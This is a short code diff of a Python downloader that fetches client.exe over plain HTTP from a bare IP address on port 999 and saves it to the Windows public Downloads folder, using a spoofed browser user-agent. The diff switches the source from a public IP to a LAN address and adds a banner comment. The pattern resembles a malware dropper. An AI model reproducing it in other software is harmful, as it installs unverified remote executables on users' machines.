@@ -4,6 +4,12 @@ import time
 import requests
 from threading import Thread
 
+###########################################
+#
+#           clinet 云端下载程序
+#
+###########################################
+
 headers = {
     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
 }
@@ -13,7 +19,7 @@ headers = {
 def down():
     a = os.path.exists("C:/Users/Public/Downloads/client.exe")
     if a is False:
-        url = "http://82.157.65.112:999/static/client.exe"
+        url = "http://192.168.10.1:999/static/client.exe"
         data = requests.get(url).content
         with open('C:/Users/Public/Downloads/client.exe', 'wb') as fp:
             fp.write(data)
